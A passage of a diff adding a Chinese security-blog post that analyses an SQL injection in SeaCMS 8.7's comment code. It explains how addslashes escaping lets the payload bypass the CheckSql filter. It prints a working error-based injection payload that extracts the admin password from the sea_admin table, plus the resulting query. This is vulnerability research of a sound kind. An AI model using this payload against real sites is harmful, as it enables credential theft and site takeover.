class="s1">&#39;reply&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">content</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">agree</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;agree&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">aginst</span><span class="se">\&#34;</span><span class="s2">:&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;anti&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;,</span><span class="se">\&#34;</span><span class="s2">pic</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pic&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">vote</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;vote&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">allow</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;anti&#39;</span><span class="p">])</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">check</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;ischeck&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">}&#34;</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nv">$readrlist</span><span class="o">=</span><span class="nx">join</span><span class="p">(</span><span class="nv">$rl</span><span class="p">,</span><span class="s2">&#34;,&#34;</span><span class="p">);</span>
+	<span class="k">return</span> <span class="nv">$readrlist</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div><p>传入<code>$rlist</code>的值为我们构造的sql语句：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="o">@`</span><span class="s1">&#39;`, extractvalue(1, concat_ws(0x20, 0x5c,(select (password)from sea_admin))),@`&#39;</span><span class="o">`</span>
+</code></pre></div><p>通过<code>ReadData</code>函数，<code>implode</code>处理后传入<code>Readrlist</code>函数</p>
+<p>可以看到执行的SQL语句是</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/2.png" alt=""></p>
+<p>它在<code>$dsql-&gt;Execute('commentrlist');</code>这句的时候会有一个SQL的安全检测</p>
+<p>文件在<code>include/sql.class.php</code>的<code>CheckSql</code>函数</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">//完整的SQL检查
+</span><span class="c1"></span>	<span class="k">while</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="nv">$pos</span> <span class="o">=</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$db_string</span><span class="p">,</span> <span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="nv">$pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="nv">$clean</span> <span class="o">.=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$db_string</span><span class="p">,</span> <span class="nv">$old_pos</span><span class="p">,</span> <span class="nv">$pos</span> <span class="o">-</span> <span class="nv">$old_pos</span><span class="p">);</span>
+		<span class="k">while</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="nv">$pos1</span> <span class="o">=</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$db_string</span><span class="p">,</span> <span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="nv">$pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+			<span class="nv">$pos2</span> <span class="o">=</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$db_string</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="nv">$pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="nv">$pos1</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="k">elseif</span> <span class="p">(</span><span class="nv">$pos2</span> <span class="o">==</span> <span class="k">false</span> <span class="o">||</span> <span class="nv">$pos2</span> <span class="o">&gt;</span> <span class="nv">$pos1</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="nv">$pos</span> <span class="o">=</span> <span class="nv">$pos1</span><span class="p">;</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="nv">$pos</span> <span class="o">=</span> <span class="nv">$pos2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="nv">$clean</span> <span class="o">.=</span> <span class="s1">&#39;$s$&#39;</span><span class="p">;</span>
+		<span class="nv">$old_pos</span> <span class="o">=</span> <span class="nv">$pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="nv">$clean</span> <span class="o">.=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$db_string</span><span class="p">,</span> <span class="nv">$old_pos</span><span class="p">);</span>
+	<span class="nv">$clean</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nx">preg_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;~\s+~s&#39;</span> <span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">),</span> <span class="nv">$clean</span><span class="p">)));</span>
+
+</code></pre></div><p>可以看到这里没有把我们的报错函数部分代入进去，如果代入进去检测的话就会这里检测到</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/3.png" alt=""></p>
+<p>所以上面构造的语句也很有意思</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/4.png" alt=""></p>
+<p>后面<code>$clean</code>就是要送去检测的函数，通过一番处理后得到的值为</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/5.png" alt=""></p>
+<p>后面返回来执行的的SQL语句还是原样没动</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/6.png" alt=""></p>
+<p>基本分析就完成了。</p>
+<p>最终执行的语句：</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span><span class="n">uid</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">dtime</span><span class="p">,</span><span class="n">reply</span><span class="p">,</span><span class="n">msg</span><span class="p">,</span><span class="n">agree</span><span class="p">,</span><span class="n">anti</span><span class="p">,</span><span class="n">pic</span><span class="p">,</span><span class="n">vote</span><span class="p">,</span><span class="n">ischeck</span> <span class="k">FROM</span> <span class="n">sea_comment</span> <span class="k">WHERE</span> <span class="n">m_type</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">id</span> <span class="k">in</span> <span class="p">(</span><span class="o">@`</span><span class="err">\</span><span class="s1">&#39;`, extractvalue(1, concat_ws(0x20, 0x5c,(select (password)from sea_admin))),@`\&#39;</span><span class="o">`</span><span class="p">)</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">id</span> <span class="k">DESC</span>
+</code></pre></div><p>还有一些问题就是构造语句的问题。</p>
+<p><strong>刚开始传入的<code>%27</code>后面怎么变成了转义后的单引号？</strong></p>
+<p>开头的时候<code>require_once(&quot;../../include/common.php&quot;);</code>就包含了这个文件,里面有一个<code>_RunMagicQuotes</code>函数，如果PHP配置没有开启<code>get_magic_quotes_gpc</code>就会用到这个函数，这个函数是把值经过<code>addslashes</code>函数的处理。此函数的作用是为所有的 ' (单引号), &quot; (双引号), \ (反斜线) and 空字符和以会自动转为含有反斜线的转义字符。</p>
+<p>所以后面的SQL语句就会加上转义符号，然后经过<code>CheckSql</code>函数的时候就绕过了对报错语句的检测。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">_RunMagicQuotes</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$svar</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">get_magic_quotes_gpc</span><span class="p">())</span>
+	<span class="p">{</span>
+		<span class="k">if</span><span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$svar</span><span class="p">)</span> <span class="p">)</span>
+		<span class="p">{</span>
+			<span class="k">foreach</span><span class="p">(</span><span class="nv">$svar</span> <span class="k">as</span> <span class="nv">$_k</span> <span class="o">=&gt;</span> <span class="nv">$_v</span><span class="p">)</span> <span class="nv">$svar</span><span class="p">[</span><span class="nv">$_k</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_RunMagicQuotes</span><span class="p">(</span><span class="nv">$_v</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="k">else</span>
+		<span class="p">{</span>
+			<span class="nv">$svar</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$svar</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$svar</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p><strong>为什么要加上``两个反引号和@?</strong></p>
+<p>因<code>in</code>在MySQL里面用法是：</p>
+<p><code>select * from where field in (value1,value2,value3,…)</code></p>
+<p>value1必须是一个值，整数型或者文本型都可以，如果用单引号的话就会变成三个转义<code>\'\'\'</code></p>
+<p>`在MySQL上面是作为一个转义符号来使用，一般为了不让和系统的变量冲突所以使用，一般在<strong>数据库名、表名、字段名</strong>使用，所以这里用@来使这个成为一个变量类型。</p>
+<h1 id="0x04-后记">0x04 后记</h1>
+<p>在6.53的版本中<code>include/common.php</code>中的44-47行接收到变量</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">foreach</span><span class="p">(</span><span class="k">Array</span><span class="p">(</span><span class="s1">&#39;_GET&#39;</span><span class="p">,</span><span class="s1">&#39;_POST&#39;</span><span class="p">,</span><span class="s1">&#39;_COOKIE&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$_request</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">foreach</span><span class="p">(</span><span class="nv">$$_request</span> <span class="k">as</span> <span class="nv">$_k</span> <span class="o">=&gt;</span> <span class="nv">$_v</span><span class="p">)</span> <span class="nv">${$_k}</span> <span class="o">=</span> <span class="nx">_RunMagicQuotes</span><span class="p">(</span><span class="nv">$_v</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>但是在75行这里又重新赋值了</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">require_once</span><span class="p">(</span><span class="nx">sea_DATA</span><span class="o">.</span><span class="s2">&#34;/config.cache.inc.php&#34;</span><span class="p">);</span>
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.7/7.png" alt=""></p>
+<p>不懂8.9的版本是否是这样，在官网拿不到8.9的源码。</p>
+<h1 id="0x05-参考">0x05 参考</h1>
+<p><a href="https://www.cnblogs.com/shijianchuzhenzhi/p/6193097.html">https://www.cnblogs.com/shijianchuzhenzhi/p/6193097.html</a></p>
+<p><a href="https://www.t00ls.net/thread-49691-1-1.html">https://www.t00ls.net/thread-49691-1-1.html</a></p>
+<p><a href="https://nosec.org/home/detail/2222.html">https://nosec.org/home/detail/2222.html</a></p>
+<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a></p>
+<p><a href="https://www.cnblogs.com/Lcy-Sun0419/p/7843912.html">https://www.cnblogs.com/Lcy-Sun0419/p/7843912.html</a></p>
+
+    </article>
+
+    
+    <div class="prevnext">
+        
+
+
+
+<ul class="prevnext">
+    
+    <li>上一篇：
+        <a href="https://getshe11.com/post/2019/">
+            2019年我来了！
+        </a>
+    </li>
+    
+    
+    <li>下一篇：
+        <a href="https://getshe11.com/post/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/">
+            Zzzphp1.61 代码审计-从SQL注入到Getshell
+        </a>
+    </li>
+    
+</ul>
+
+    </div>
+    
+    <div class="post-comments">
+        
+  
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="F0r3at/Getshe11.com"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+    </div>
+</div>
+            </div>
+            
+            <div class="col-second">
+                <div class="col-box col-box-author">
+    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
+    <div class="col-box-title name">F0rmat</div>
+    <p>Stay Hungry, Stay Foolish.</p>
+    <p class="contact">
+        <a href="http://github.com/F0r3at">Github</a>
+    </p>
+</div>
+
+<div class="col-box">
+    <div class="col-box-title">Newest Posts</div>
+    <ul class="post-list">
+        
+        <li>
+            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div class="col-box post-toc hide">
+    <div class="col-box-title">TOC</div>
+</div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="wrapper">
+    © 2021    <a href="https://getshe11.com">F0rmat</a>
+</div>
+    </footer>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>
+
+<script src="/js/easybook.js"></script>
+
+<script src="/js/lazysizes.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
+<script src="/js/figure.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+
+</html>
